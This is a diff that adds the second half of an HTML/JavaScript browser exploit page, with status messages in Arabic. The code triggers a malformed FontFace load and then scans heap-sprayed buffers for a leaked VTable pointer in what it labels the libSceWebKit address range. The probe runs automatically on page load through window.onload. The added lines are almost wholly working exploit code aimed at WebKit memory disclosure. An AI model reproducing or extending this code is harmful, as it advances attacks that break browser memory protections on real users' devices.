@@ -33,4 +33,38 @@
                 let font = new FontFace('TestFont', 'url(data:font/opentype;base64,AAAA)');
                 let loadPromise = font.load();
                 
-                //
+                // انتظار النتيجة
+                await loadPromise.catch((e) => {
+                    document.getElementById('status').innerText = "فشل التحميل (متوقع) - جاري تحليل الذاكرة...";
+                    setTimeout(probeMemoryForVTable, 1000);
+                });
+            } catch (err) {
+                document.getElementById('status').innerText = "خطأ: " + err.message;
+            }
+        }
+
+        // دالة فحص الذاكرة لكشف العناوين
+        async function probeMemoryForVTable() {
+            document.getElementById('status').innerText = "جاري فحص الذاكرة بحثاً عن VTable...";
+            
+            for (let i = 0; i < heapSpray.length; i++) {
+                let view = new DataView(heapSpray[i]);
+                try {
+                    // قراءة أول 8 بايتات (موقع الـ VTable)
+                    let potentialVTable = view.getBigUint64(0, true);
+                    
+                    // التحقق إذا كان العنوان يقع في نطاق مكتبة libSceWebKit
+                    if (potentialVTable > 0x100000000n && potentialVTable < 0x800000000n) {
+                        document.getElementById('status').innerText = "تم العثور على تسريب VTable: " + potentialVTable.toString(16);
+                        console.log("Leak at index " + i + ": " + potentialVTable.toString(16));
+                        return;
+                    }
+                } catch (e) { continue; }
+            }
+            document.getElementById('status').innerText = "فشل الكشف - جاري محاولة ضبط الحجم.";
+        }
+
+        window.onload = runExploitProbe;
+    </script>
+</body>
+</html>
